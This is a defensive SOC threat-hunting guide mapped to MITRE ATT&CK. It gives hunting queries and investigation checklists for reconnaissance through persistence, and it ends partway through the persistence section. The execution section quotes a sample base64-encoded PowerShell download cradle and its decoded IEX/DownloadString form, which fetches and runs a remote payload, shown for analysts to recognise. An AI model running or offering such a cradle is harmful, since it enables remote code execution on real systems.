---
title: "Threat Hunting Soc Guide Comprehensive"
category: "Security Engineer"
tags: ["SOC"]
lastUpdated: "2026-06-05"
---

# 🎯 Threat Hunting SOC Guide — Part 1: MITRE ATT&CK Framework, Methodologies & Tactics (Recon → Execution)

---

# PART 1: THREAT HUNTING FUNDAMENTALS & MITRE ATT&CK MAPPED INVESTIGATIONS

---

## 1. What Is Threat Hunting?

### 1.1 Definition

Threat hunting is the **proactive, hypothesis-driven** process of searching through networks, endpoints, and datasets to detect threats that evade existing automated security solutions (SIEM rules, EDR signatures, IDS/IPS). Unlike reactive SOC operations (alert triage), threat hunting **assumes compromise** and actively looks for evidence of adversary activity.

### 1.2 Threat Hunting vs. Alert Triage

| Aspect | Alert Triage (Reactive) | Threat Hunting (Proactive) |
|--------|------------------------|---------------------------|
| **Trigger** | Automated alert fires | Hypothesis or intelligence-driven |
| **Approach** | Investigate what the system detected | Search for what the system **missed** |
| **Mindset** | "Is this alert real?" | "What threats are hiding in our environment?" |
| **Scope** | Single alert/event | Environment-wide or campaign-focused |
| **Output** | TP/FP verdict + response | New detections, IOCs, improved visibility |
| **Frequency** | Continuous (as alerts come in) | Scheduled or triggered by intel |
| **Skill Level** | L1-L2 SOC Analysts | L2-L3 Analysts, Threat Hunters |
| **Tools** | SIEM, EDR alerts | SIEM queries, EDR telemetry, threat intel, custom scripts |

### 1.3 The Three Hunting Models

```
┌──────────────────────────────────────────────────────────────────────┐
│                    THREAT HUNTING MODELS                              │
├──────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. INTEL-DRIVEN (Reactive Hunting)                                  │
│     ├─ Triggered by: New threat intelligence (IOCs, reports, CVEs)   │
│     ├─ Method: Search for known IOCs across environment              │
│     ├─ Example: New APT report → search for their known C2 IPs      │
│     └─ Maturity Level: Beginner                                     │
│                                                                      │
│  2. HYPOTHESIS-DRIVEN (Proactive Hunting)                            │
│     ├─ Triggered by: Analyst intuition + MITRE ATT&CK knowledge     │
│     ├─ Method: Formulate hypothesis → test against data             │
│     ├─ Example: "Attackers may be using LOLBins for lateral movement"│
│     └─ Maturity Level: Intermediate                                  │
│                                                                      │
│  3. DATA-DRIVEN (Analytics-Based)                                    │
│     ├─ Triggered by: Statistical anomalies in baseline data          │
│     ├─ Method: Machine learning, baselining, outlier detection       │
│     ├─ Example: Anomalous DNS query volume from a single host        │
│     └─ Maturity Level: Advanced                                      │
│                                                                      │
└──────────────────────────────────────────────────────────────────────┘
```

---

## 2. MITRE ATT&CK Framework — Overview for Threat Hunters

### 2.1 What Is MITRE ATT&CK?

MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) is a globally accessible knowledge base of adversary behavior based on real-world observations. It categorizes **what** adversaries do (Tactics), **how** they do it (Techniques), and specific **implementations** (Sub-techniques/Procedures).

### 2.2 ATT&CK Matrix Structure

```
┌───────────────────────────────────────────────────────────────────────────┐
│                        MITRE ATT&CK ENTERPRISE MATRIX                     │
├───────────────────────────────────────────────────────────────────────────┤
│                                                                           │
│   TACTICS (WHY — the adversary's goal)                                    │
│   └─ TECHNIQUES (HOW — the method used to achieve the goal)              │
│       └─ SUB-TECHNIQUES (SPECIFIC — variation of the technique)          │
│           └─ PROCEDURES (IMPLEMENTATION — real-world group usage)         │
│                                                                           │
│   Example:                                                                │
│   Tactic:         Credential Access                                       │
│   Technique:      OS Credential Dumping (T1003)                          │
│   Sub-Technique:  LSASS Memory (T1003.001)                               │
│   Procedure:      APT28 uses Mimikatz to dump LSASS credentials         │
│                                                                           │
└───────────────────────────────────────────────────────────────────────────┘
```

### 2.3 The 14 ATT&CK Tactics (Enterprise)

| # | Tactic ID | Tactic | Goal | Key Techniques |
|---|-----------|--------|------|----------------|
| 1 | TA0043 | **Reconnaissance** | Gather info for planning | Active/Passive scanning, Phishing for info |
| 2 | TA0042 | **Resource Development** | Establish resources for operations | Acquire infrastructure, Develop capabilities |
| 3 | TA0001 | **Initial Access** | Get into the network | Phishing, Exploit public-facing app, Valid accounts |
| 4 | TA0002 | **Execution** | Run malicious code | PowerShell, WMI, Scripting, Scheduled tasks |
| 5 | TA0003 | **Persistence** | Maintain foothold | Registry Run keys, Scheduled tasks, Account creation |
| 6 | TA0004 | **Privilege Escalation** | Gain higher-level permissions | Token manipulation, Exploitation, UAC bypass |
| 7 | TA0005 | **Defense Evasion** | Avoid detection | Obfuscation, Disabling security, Masquerading |
| 8 | TA0006 | **Credential Access** | Steal credentials | Credential dumping, Keylogging, Brute force |
| 9 | TA0007 | **Discovery** | Explore the environment | Network scanning, Account discovery, System info |
| 10 | TA0008 | **Lateral Movement** | Move through the environment | RDP, SMB, PsExec, WinRM |
| 11 | TA0009 | **Collection** | Gather target data | Screen capture, Keylogging, Email collection |
| 12 | TA0011 | **Command and Control** | Communicate with implants | DNS tunneling, HTTPS C2, Domain fronting |
| 13 | TA0010 | **Exfiltration** | Steal data out | Exfil over C2, Exfil to cloud, Scheduled transfer |
| 14 | TA0040 | **Impact** | Disrupt/Destroy | Ransomware, Data destruction, Defacement |

### 2.4 How Threat Hunters Use MITRE ATT&CK

```
┌──────────────────────────────────────────────────────────────────────┐
│           MITRE ATT&CK FOR THREAT HUNTING WORKFLOW                   │
├──────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. MAP DETECTION COVERAGE                                           │
│     ├─ Overlay your SIEM/EDR detections on ATT&CK Matrix            │
│     ├─ Identify GAPS (tactics/techniques with NO detection)          │
│     └─ Prioritize hunting in unmonitored areas                       │
│                                                                      │
│  2. FORMULATE HUNTING HYPOTHESES                                     │
│     ├─ Pick a tactic/technique relevant to your threat model        │
│     ├─ "If adversary does T1059.001 (PowerShell), what traces?"     │
│     └─ Design queries to find those traces                           │
│                                                                      │
│  3. INVESTIGATE RESULTS                                              │
│     ├─ Analyze returned data for true adversary behavior             │
│     ├─ Eliminate false positives (system admins, automation)         │
│     └─ Correlate findings with other tactics in kill chain          │
│                                                                      │
│  4. CREATE / IMPROVE DETECTIONS                                      │
│     ├─ Convert hunting findings into automated SIEM rules           │
│     ├─ Write Sigma rules or KQL queries                              │
│     └─ Document in detection engineering backlog                     │
│                                                                      │
│  5. REPORT & ITERATE                                                 │
│     ├─ Document hunting results (positive or negative)              │
│     ├─ Share IOCs and TTPs with SOC and threat intel team            │
│     └─ Update threat model and repeat cycle                          │
│                                                                      │
└──────────────────────────────────────────────────────────────────────┘
```

---

## 3. Threat Hunting Process — Step by Step

### 3.1 The Hunting Cycle

```
    ┌──────────────┐
    │  1. CREATE    │◄────────────────────────────────┐
    │  HYPOTHESIS   │                                  │
    └──────┬───────┘                                  │
           │                                          │
           ▼                                          │
    ┌──────────────┐                                  │
    │ 2. GATHER    │                                  │
    │ DATA/LOGS    │                                  │
    └──────┬───────┘                                  │
           │                                          │
           ▼                                          │
    ┌──────────────┐                                  │
    │ 3. RUN       │                                  │
    │ ANALYTICS    │                                  │
    └──────┬───────┘                                  │
           │                                          │
           ▼                                          │
    ┌──────────────┐         ┌──────────────┐        │
    │ 4. ANALYZE   │────────►│ 5. FINDINGS? │        │
    │ RESULTS      │         │              │        │
    └──────────────┘         └──────┬───────┘        │
                                    │                 │
                              YES   │   NO            │
                               │    │    │            │
                               ▼    │    ▼            │
                         ┌─────────┐│ ┌─────────┐    │
                         │ CREATE  ││ │ REFINE   │    │
                         │ DETECT/ ││ │ HYPOTHESIS│────┘
                         │ RESPOND ││ │ & QUERY  │
                         └─────────┘│ └─────────┘
                                    │
                               ▼    │
                         ┌─────────┐
                         │DOCUMENT │
                         │& SHARE  │
                         └─────────┘
```

### 3.2 Hypothesis Construction Framework

| Component | Description | Example |
|-----------|-------------|---------|
| **Threat Actor** | Who might attack us? | APT29; Ransomware gang; Insider threat |
| **Tactic** | What is their goal? | Persistence; Credential Access |
| **Technique** | How would they achieve it? | T1053 - Scheduled Task; T1003 - Credential Dumping |
| **Data Source** | What logs show this behavior? | Windows Event Logs, EDR telemetry, Sysmon |
| **Expected Evidence** | What would we see in the data? | New scheduled tasks created by non-admin users |
| **Baseline** | What is normal? | IT admin creates scheduled tasks for patching |

**Example Hypothesis:**
> "An adversary may have established persistence in our environment by creating scheduled tasks (T1053.005) to execute malicious payloads. I will search for recently created scheduled tasks by non-standard accounts, created outside of change windows, pointing to unusual binary paths."

### 3.3 Key Data Sources for Hunting

| Data Source | What It Captures | Key Event IDs / Logs |
|-------------|-----------------|---------------------|
| **Windows Event Logs** | Authentication, process execution, PowerShell | 4624, 4625, 4688, 4672, 4720, 4732, 7045 |
| **Sysmon** | Process creation, network connections, file creation | Event 1 (Process Create), 3 (Network), 7 (Image Loaded), 11 (File Create), 13 (Registry) |
| **EDR Telemetry** | Endpoint behavior, process trees, file modifications | CrowdStrike, Defender for Endpoint, SentinelOne |
| **Firewall/Proxy Logs** | Network connections, URL requests, blocked traffic | Connection logs, URL filtering logs |
| **DNS Logs** | Domain resolution queries | Query logs, response logs |
| **Cloud Logs** | Azure AD/Entra, AWS CloudTrail, GCP Audit | Sign-in logs, API calls, IAM changes |
| **Email Logs** | Email flow, attachments, URL clicks | Exchange message trace, SEG logs |
| **Network Flow** | NetFlow/IPFIX data, packet captures | Source/Dest IP, ports, bytes, duration |

---

## 4. MITRE ATT&CK Tactic-by-Tactic Hunting Guide

### 4.1 TA0043 — Reconnaissance

#### Overview
Adversaries gather information about the target before attacking. While most recon happens externally (outside your network), you can detect **active reconnaissance** like port scanning and responses to information-gathering emails.

#### Key Techniques

| Technique ID | Technique | Description |
|-------------|-----------|-------------|
| T1595 | Active Scanning | Port scanning, vulnerability scanning from external IPs |
| T1589 | Gather Victim Identity Info | Harvesting employee names, emails, credentials from public sources |
| T1590 | Gather Victim Network Info | Identifying IP ranges, domains, DNS records |
| T1591 | Gather Victim Org Info | Business relationships, physical locations, roles |
| T1598 | Phishing for Information | Spear-phishing emails designed to gather intel (not deliver malware) |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| External port scanning | Firewall/IDS | High volume of connection attempts from single external IP to multiple ports |
| Reconnaissance phishing | Email gateway | Emails requesting org chart, contact info, technology stack details |
| Web scraping of public assets | Web server logs | Unusual crawling patterns on career pages, leadership pages |
| DNS reconnaissance | DNS logs | High volume of DNS queries for subdomains from external source (subdomain enumeration) |

#### ✅ True Positive Scenario — Active Scanning Detected

**Scenario:** Firewall logs show an external IP (`185.220.101.x`) sent SYN packets to 500+ ports on your DMZ server within 5 minutes.

**Investigation Steps:**
```
1. CONFIRM THE ACTIVITY
   □ Review firewall logs for the source IP
   □ Confirm high port-scan volume (> 100 ports in < 10 min)
   □ Identify targeted assets (what servers/ranges were scanned)

2. ENRICH THE SOURCE IP
   □ Check AbuseIPDB, VirusTotal, Shodan for source IP reputation
   □ Check if IP belongs to known threat actor infrastructure
   □ Check if IP is a TOR exit node or VPN provider
   □ Geolocate the IP

3. ASSESS IMPACT
   □ Were any ports open/responsive?
   □ Did the scanner find any vulnerable services?
   □ Were there follow-up exploitation attempts?
   □ Check IDS/IPS for signature-based alerts from same IP

4. RESPOND
   □ Block the source IP at perimeter firewall
   □ Add IP to threat intel watchlist
   □ Notify vulnerability management team of scanned assets
   □ Verify patch status of exposed services
   □ Monitor for follow-up activity from same IP range

5. DOCUMENT
   □ Log finding in threat hunting report
   □ Create SIEM correlation rule for future scans from this range
   □ Update threat model with targeting information
```

**TP Confidence:** 🔴 HIGH — External entity actively scanning your infrastructure is always a TP for reconnaissance.

---

### 4.2 TA0042 — Resource Development

#### Overview
Adversaries establish infrastructure, acquire tools, and prepare capabilities before the attack. This tactic is **mostly undetectable** from within the target's environment but can be observed through:
- Newly registered domains mimicking your brand
- Infrastructure associated with known threat actors

#### Key Techniques

| Technique ID | Technique | Description |
|-------------|-----------|-------------|
| T1583 | Acquire Infrastructure | Register domains, rent VPS, buy IP ranges |
| T1584 | Compromise Infrastructure | Hack legitimate servers for C2 |
| T1587 | Develop Capabilities | Build custom malware, exploits |
| T1588 | Obtain Capabilities | Download tools like Cobalt Strike, Mimikatz |
| T1585 | Establish Accounts | Create accounts for social engineering |
| T1586 | Compromise Accounts | Take over legitimate accounts for use in ops |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| Lookalike domains | Domain monitoring service | Newly registered domains similar to your brand name (typosquats, homoglyphs) |
| Staged tools/payloads | Threat intel feeds | Known malicious tools hosted on infrastructure matching your threat model |
| Compromised infrastructure | Passive DNS | Legitimate domains suddenly resolving to suspicious IPs |

#### ✅ True Positive Scenario — Lookalike Domain Registered

**Scenario:** Domain monitoring service alerts that `yourcompany-login.com` was registered 2 days ago. Passive DNS shows it resolves to a known bulletproof hosting provider.

**Investigation Steps:**
```
1. CONFIRM THE DOMAIN
   □ WHOIS lookup: registrar, registrant (often privacy-protected), creation date
   □ Passive DNS: what IPs does it resolve to?
   □ Check if the domain has MX records (email-capable)
   □ Check if a website is hosted (credential harvesting page?)

2. ASSESS RISK
   □ Does the domain mimic your login portal?
   □ Is MX configured to send/receive email (BEC risk)?
   □ Has it been used in phishing campaigns already?
   □ Check URLScan.io for any captures of the domain

3. RESPOND
   □ Submit takedown request to registrar
   □ Add domain to email gateway and web proxy blocklists
   □ Create SIEM alert for any internal connections to this domain
   □ Notify phishing awareness team
   □ Check if any employees have already visited this domain (proxy logs)

4. PROACTIVE
   □ Acquire similar variations yourself (defensive registration)
   □ Set up ongoing monitoring for brand-impersonating domains
```

**TP Confidence:** 🔴 HIGH — Lookalike domain targeting your org with active infrastructure is confirmed resource development.

---

### 4.3 TA0001 — Initial Access

#### Overview
Adversaries use various methods to gain initial foothold in the target network. This is where most attacks become **detectable by SOC teams**.

#### Key Techniques

| Technique ID | Technique | Description | Common Detection Source |
|-------------|-----------|-------------|------------------------|
| T1566 | Phishing | Spear-phishing emails with links/attachments | Email gateway, SIEM |
| T1566.001 | Phishing: Attachment | Malicious file attached to email | Email gateway, EDR |
| T1566.002 | Phishing: Link | Malicious URL in email body | Email gateway, Proxy |
| T1190 | Exploit Public-Facing App | Exploit vulnerabilities in web apps, VPN, RDP | WAF, IDS/IPS, App logs |
| T1133 | External Remote Services | Abuse VPN, RDP, Citrix for access | Auth logs, VPN logs |
| T1078 | Valid Accounts | Use stolen/compromised credentials | Auth logs, UEBA |
| T1199 | Trusted Relationship | Abuse supply chain / partner connections | Network logs, Auth logs |
| T1195 | Supply Chain Compromise | Compromise software supply chain | Endpoint, Integrity monitoring |
| T1189 | Drive-by Compromise | Exploit browser via compromised website | Proxy, EDR, IDS |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| Phishing delivery | Email logs | Emails with suspicious attachments (.iso, .img, .lnk, .hta, .vbs) from external senders |
| Exploitation attempts | WAF/IDS logs | SQL injection, path traversal, RCE attempts against public apps |
| Credential stuffing | Auth logs | High volume of failed logins from single IP/IP range against multiple accounts |
| VPN brute force | VPN logs | Repeated authentication failures → eventual success |
| Compromised credentials | SIEM/UEBA | Successful login from unusual geo, impossible travel, new device+location |
| Supply chain | EDR | Signed software executing unexpected child processes |

#### ✅ True Positive Scenario — Phishing with Malicious Attachment (T1566.001)

**Scenario:** SEG quarantined an email with a `.iso` file attached. Subject: "Q4 Financial Review — URGENT". Sender domain `finance-reports-2024.com` was registered 3 days ago.

**Investigation Steps:**
```
1. EMAIL ANALYSIS
   □ Full header analysis: Return-Path, X-Originating-IP, auth results
   □ WHOIS on sender domain: age < 30 days → 🔴
   □ SPF/DKIM/DMARC status → likely all fail
   □ Check if email reached any mailboxes (bypass quarantine?)

2. ATTACHMENT ANALYSIS
   □ Calculate file hash (SHA256)
   □ Check hash on VirusTotal → any detections?
   □ Submit to sandbox (Any.Run, Hybrid Analysis)
   □ Mount the .iso → what files are inside? (.lnk? .exe? .dll?)
   □ Check for hidden files, double extensions
   □ Analyze any scripts/macros inside

3. SCOPE ASSESSMENT
   □ How many recipients received this email?
   □ Search for similar subject lines, sender domains, attachment hashes
   □ Check if any user interacted (clicked, opened, mounted)
   □ If mounted: check EDR for child process execution

4. RESPOND (if TP confirmed)
   □ Purge email from all mailboxes
   □ Block sender domain and IP at email gateway
   □ Block attachment hash at EDR
   □ If user interacted: isolate endpoint, initiate IR
   □ Submit IOCs to threat intel platform
   □ Alert organization with phishing advisory

5. DETECTION IMPROVEMENT
   □ Create/tune rule for .iso attachment detection
   □ Add domain to blocklist
   □ Review and strengthen attachment filtering policies
```

**TP Confidence:** 🔴 HIGH — New domain + weaponized attachment + urgency language + financial lure = confirmed phishing.

#### ✅ True Positive Scenario — Valid Accounts (T1078) — Compromised Credentials

**Scenario:** UEBA flags a successful login for `john.doe@corp.com` from Nigeria at 3:00 AM, followed by mailbox rule creation forwarding all emails to an external Gmail address. John is based in New York and was logged in from his office 2 hours prior.

**Investigation Steps:**
```
1. VERIFY IMPOSSIBLE TRAVEL
   □ Check Azure AD/Entra sign-in logs: timestamps, IPs, geolocations
   □ Confirm John's last known legitimate login and location
   □ Calculate travel distance and time → impossible?
   □ Check if IP is known VPN/proxy/TOR exit node

2. CHECK POST-LOGIN ACTIVITY
   □ Review mailbox rules: forwarding, delete, move rules created
   □ Review sent items: any mass emails or phishing sent?
   □ Check for OAuth app consent grants
   □ Check for password/MFA changes
   □ Review Azure AD audit logs: role changes, app registrations

3. CONFIRM COMPROMISE
   □ Contact John via out-of-band communication (phone call)
   □ Ask if he traveled or used VPN
   □ If NOT John → CONFIRMED COMPROMISE

4. RESPOND
   □ Revoke all active sessions (Azure AD: Revoke-AzureADUserAllRefreshToken)
   □ Reset password immediately
   □ Reset MFA registration
   □ Remove malicious inbox rules
   □ Block the external forwarding address
   □ Review and revert any unauthorized changes
   □ Check if credentials were exposed in known breaches (HaveIBeenPwned)

5. SCOPE EXPANSION
   □ Search for similar impossible travel events for other users
   □ Check if any other accounts logged in from the same Nigerian IP
   □ Review VPN/SSO logs for related anomalies
   □ Check if password spray preceded this login
```

**TP Confidence:** 🔴 HIGH — Impossible travel + inbox rule forwarding to external address = confirmed account compromise.

---

### 4.4 TA0002 — Execution

#### Overview
After gaining access, adversaries execute malicious code. This is one of the **most detectable** tactics because it generates rich telemetry in endpoint logs.

#### Key Techniques

| Technique ID | Technique | Description | Key Detection |
|-------------|-----------|-------------|---------------|
| T1059.001 | PowerShell | Execute PS commands/scripts | Event 4104 (Script Block), Sysmon 1 |
| T1059.003 | Windows Command Shell | cmd.exe execution | Sysmon 1, Event 4688 |
| T1059.005 | Visual Basic (VBA) | Macro execution in Office | EDR, Event 4688 (child of WINWORD.EXE) |
| T1059.007 | JavaScript/JScript | .js execution via wscript/cscript | Sysmon 1, EDR |
| T1047 | WMI (WMIC) | Remote execution via WMI | Event 4688, Sysmon 1 (wmiprvse.exe) |
| T1053.005 | Scheduled Task | Task scheduler for execution | Event 4698, Sysmon 1 (schtasks.exe) |
| T1204.001 | User Execution: Link | User clicks malicious link | Proxy logs, EDR |
| T1204.002 | User Execution: File | User opens malicious file | EDR, Sysmon 1 |
| T1569.002 | System Services: Service | Create service to run code | Event 7045, 4697 |
| T1106 | Native API | Direct API calls (NtCreateThread) | EDR, API monitoring |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| Suspicious PowerShell | Windows Events (4104, 4103) | Encoded commands (-enc), download cradles (IEX, Invoke-WebRequest), AMSI bypass |
| Office spawning processes | EDR/Sysmon | WINWORD.EXE → cmd.exe, powershell.exe, mshta.exe, wscript.exe |
| LOLBin execution | EDR/Sysmon | mshta.exe, regsvr32.exe, certutil.exe, rundll32.exe with unusual arguments |
| WMI remote execution | Event 4688/Sysmon | wmic.exe /node: process call create |
| Suspicious scheduled tasks | Event 4698 | Tasks created by non-admin users, pointing to TEMP/AppData paths |
| Script execution | Sysmon Event 1 | cscript.exe or wscript.exe running .js, .vbs, .wsf files from user directories |

#### ✅ True Positive Scenario — Malicious PowerShell Execution (T1059.001)

**Scenario:** SIEM alert fires on PowerShell Script Block Logging (Event 4104). A workstation executed:
```powershell
powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==
```

**Investigation Steps:**
```
1. DECODE THE COMMAND
   □ Base64 decode the -Enc value
   □ Decoded: IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.10/payload.ps1')
   □ This is a classic download cradle → 🔴 MALICIOUS

2. ANALYZE EXECUTION CONTEXT
   □ What user ran this? (domain\user from Event 4688)
   □ What was the parent process? (explorer.exe? outlook.exe? winword.exe?)
   □ When did it execute? (during business hours or off-hours?)
   □ What endpoint is this? (workstation, server, admin jump box?)

3. CHECK NETWORK ACTIVITY
   □ Did the host connect to 192.168.1.10? (is this internal or external?)
   □ Was payload.ps1 downloaded successfully?
   □ What did the payload contain? (if captured by proxy/PCAP)
   □ Check for subsequent outbound connections (C2)

4. ENDPOINT INVESTIGATION
   □ Check process tree in EDR: what spawned after PowerShell?
   □ Check for persistence mechanisms created (scheduled tasks, registry)
   □ Check for credential access (LSASS access, SAM dump)
   □ Check for lateral movement (RDP, SMB, WMI connections)
   □ Check for file drops in TEMP, AppData, ProgramData

5. RESPOND
   □ Isolate the endpoint immediately
   □ Capture forensic image if required
   □ Block the C2 IP/domain at firewall and proxy
   □ Kill the malicious process tree
   □ Reset user credentials
   □ Scan for persistence artifacts and remove
   □ Hunt for same IOCs across the environment
```

**TP Confidence:** 🔴 CRITICAL — Encoded PowerShell download cradle with hidden window = confirmed malicious execution.

#### ✅ True Positive Scenario — Office Document Spawns Child Process (T1204.002 + T1059.005)

**Scenario:** EDR alerts that `WINWORD.EXE` spawned `cmd.exe`, which then launched `powershell.exe` on a Finance department workstation. The user opened an email attachment named `Invoice_Details.docm`.

**Investigation Steps:**
```
1. PROCESS TREE ANALYSIS
   □ Map the full process chain:
     OUTLOOK.EXE → WINWORD.EXE → cmd.exe → powershell.exe
   □ This is a CLASSIC macro-enabled document attack chain → 🔴
   □ Check PowerShell command line arguments
   □ Check if PowerShell made network connections

2. DOCUMENT ANALYSIS
   □ Retrieve the .docm file (from email quarantine or endpoint)
   □ Calculate file hash → check VirusTotal
   □ Extract and analyze VBA macros (olevba, oletools)
   □ Look for: AutoOpen/Document_Open, Shell(), CreateObject, WScript
   □ Submit to sandbox for dynamic analysis

3. EMAIL ANALYSIS
   □ Who sent the email? External or compromised internal?
   □ Check sender domain reputation and age
   □ Were other users targeted with same attachment?

4. POST-EXECUTION HUNTING
   □ What did PowerShell download/execute?
   □ Check for new files created (Sysmon Event 11)
   □ Check for registry modifications (Sysmon Event 13)
   □ Check for network connections (Sysmon Event 3)
   □ Check for persistence mechanisms
   □ Check if LSASS was accessed (credential dumping)

5. RESPOND
   □ Isolate endpoint
   □ Purge email with same attachment hash from all mailboxes
   □ Block file hash at EDR and email gateway
   □ Block any C2 infrastructure identified
   □ Reset user credentials (assume compromised)
   □ Create detection for this document's IOCs
```

**TP Confidence:** 🔴 CRITICAL — Office application spawning command shell → PowerShell is textbook macro malware execution.

---

## 5. Investigation Checklist — Universal Template

### 5.1 General Threat Hunting Investigation Checklist

```
┌───────────────────────────────────────────────────────────────────────┐
│            UNIVERSAL THREAT HUNTING INVESTIGATION CHECKLIST            │
├───────────────────────────────────────────────────────────────────────┤
│                                                                       │
│  PHASE 1: INITIAL TRIAGE (First 15 minutes)                          │
│  □ What triggered the hunt? (Intel, hypothesis, anomaly)              │
│  □ What assets are involved? (hosts, users, services)                │
│  □ What is the potential MITRE ATT&CK tactic/technique?              │
│  □ What data sources are available for investigation?                 │
│  □ Is there an active threat requiring immediate containment?         │
│                                                                       │
│  PHASE 2: DATA COLLECTION (30 minutes)                               │
│  □ Pull relevant logs from SIEM (time-bounded queries)               │
│  □ Review EDR telemetry for affected endpoints                       │
│  □ Check network logs (firewall, proxy, DNS, NetFlow)                │
│  □ Review authentication logs (AD, VPN, cloud IdP)                   │
│  □ Collect threat intelligence on any IOCs found                     │
│                                                                       │
│  PHASE 3: ANALYSIS (1-2 hours)                                       │
│  □ Construct timeline of events                                      │
│  □ Map activity to MITRE ATT&CK techniques                          │
│  □ Identify all affected systems and users                           │
│  □ Determine if this is isolated or part of a campaign               │
│  □ Differentiate legitimate activity from malicious (TP vs FP)       │
│  □ Identify root cause / initial access vector                       │
│  □ Assess lateral movement scope                                     │
│  □ Check for persistence mechanisms                                  │
│  □ Look for data staging or exfiltration indicators                  │
│                                                                       │
│  PHASE 4: VERDICATION & SCOPE                                        │
│  □ Confirm TP with supporting evidence                               │
│  □ Assess total blast radius (all affected assets)                   │
│  □ Determine severity (Critical/High/Medium/Low)                     │
│  □ Identify all IOCs (IPs, domains, hashes, file paths, user agents)│
│                                                                       │
│  PHASE 5: RESPONSE                                                    │
│  □ Contain: Isolate affected systems, block IOCs                     │
│  □ Eradicate: Remove persistence, malware, unauthorized access       │
│  □ Recover: Restore systems, reset credentials, verify integrity     │
│  □ Submit IOCs to threat intel platforms                              │
│                                                                       │
│  PHASE 6: DOCUMENTATION & IMPROVEMENT                                 │
│  □ Document full investigation timeline and findings                 │
│  □ Record all IOCs and TTPs observed                                 │
│  □ Create/update SIEM detection rules                                │
│  □ Write Sigma/YARA rules for future detection                       │
│  □ Update threat model and hunting backlog                           │
│  □ Conduct lessons learned                                           │
│  □ Share intelligence with peer organizations (if applicable)        │
│                                                                       │
└───────────────────────────────────────────────────────────────────────┘
```

### 5.2 Key Evidence to Collect Per MITRE Tactic

| Tactic | Key Evidence to Collect |
|--------|------------------------|
| **Initial Access** | Email headers, attachment hashes, sender domain WHOIS, proxy logs for URL clicks |
| **Execution** | Process creation logs (Sysmon 1, 4688), PowerShell 4104, command line arguments |
| **Persistence** | Registry keys (Run, RunOnce), scheduled tasks (4698), services created (7045), startup folders |
| **Privilege Escalation** | Token manipulation artifacts, UAC bypass techniques, exploit evidence |
| **Defense Evasion** | Timestomping evidence, process injection, disabled security services |
| **Credential Access** | LSASS access logs, SAM database access, Kerberoasting tickets, brute force attempts |
| **Discovery** | Network scanning activity, nltest, whoami, net group commands |
| **Lateral Movement** | RDP connections (4624 Type 10), PsExec (7045), WMI (4688), SMB file access |
| **Collection** | File access logs, screen capture tools, keylogger artifacts, archive creation |
| **C2** | DNS queries, proxy logs, unusual beaconing patterns, encoded traffic |
| **Exfiltration** | Large data transfers, cloud upload logs, USB activity, encrypted archives |
| **Impact** | Ransomware notes, deleted shadow copies, destroyed logs, defacement evidence |

---

*Continued in Part 2 → Persistence, Privilege Escalation, Defense Evasion, Credential Access — Advanced TP Scenarios & Hunting Playbooks*


---

# 🎯 Threat Hunting SOC Guide — Part 2: Persistence, Priv Esc, Defense Evasion & Credential Access

---

# PART 2: ATT&CK TACTICS — PERSISTENCE THROUGH CREDENTIAL ACCESS

---

## 6. TA0003 — Persistence

#### Overview
After gaining initial access, adversaries install **backdoors** and mechanisms to survive system reboots, credential resets, and remediation attempts. Persistence is one of the **most critical** hunting areas because removing it is essential to eradication.

#### Key Techniques

| Technique ID | Technique | Description | Detection Source |
|-------------|-----------|-------------|-----------------|
| T1547.001 | Registry Run Keys / Startup Folder | Auto-execute on login | Sysmon 13, Registry audit |
| T1053.005 | Scheduled Task | Execute at interval/trigger | Event 4698, Sysmon 1 |
| T1543.003 | Windows Service | Create service for persistence | Event 7045, 4697 |
| T1136 | Create Account | Create new local/domain account | Event 4720, 4722 |
| T1098 | Account Manipulation | Add to privileged group, modify perms | Event 4728, 4732, 4756 |
| T1505.003 | Web Shell | Backdoor on web server | File integrity, Web logs |
| T1546.003 | WMI Event Subscription | Permanent WMI event consumer | WMI repository, Sysmon 19-21 |
| T1574.001 | DLL Search Order Hijacking | Plant DLL in search path | EDR, Sysmon 7 |
| T1137 | Office Application Startup | Office add-in/template injection | Registry, File monitoring |
| T1556 | Modify Authentication Process | Install password filter DLL | Registry, EDR |
| T1078 | Valid Accounts | Maintain access with stolen creds | Auth logs, UEBA |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| Registry Run Key additions | Sysmon Event 13 | New values in `HKLM\...\Run`, `HKCU\...\Run`, `RunOnce` keys |
| New scheduled tasks | Event 4698 | Tasks created by non-admin users; tasks pointing to `TEMP`, `AppData`, `ProgramData` |
| New services | Event 7045 | Services with unusual names, running from user directories, PowerShell in service path |
| New user accounts | Event 4720 | Accounts created outside of provisioning tools or change windows |
| Group membership changes | Event 4728/4732/4756 | Users added to Domain Admins, Local Admins, or other privileged groups |
| Web shells | File integrity monitoring | New .aspx, .jsp, .php files in web directories (wwwroot, inetpub, webapps) |
| WMI persistence | Sysmon 19, 20, 21 | New WMI Event Filters, Consumers, and Consumer-to-Filter bindings |
| Startup folder items | Sysmon Event 11 | New .lnk, .bat, .vbs, .exe files in Startup folders |
| DLL hijacking | Sysmon Event 7 | Unsigned DLLs loaded from non-standard paths by legitimate processes |

#### ✅ True Positive Scenario — Scheduled Task Persistence (T1053.005)

**Scenario:** During a routine hunt, you discover a scheduled task named `WindowsDefenderHealthCheck` created on a domain controller by a non-admin service account. The task runs every 4 hours and executes: `C:\ProgramData\Microsoft\WindowsDefender\update.bat`.

**Investigation Steps:**
```
1. EXAMINE THE SCHEDULED TASK
   □ When was it created? (Event 4698 timestamp)
   □ Who created it? (Creator user/account in 4698)
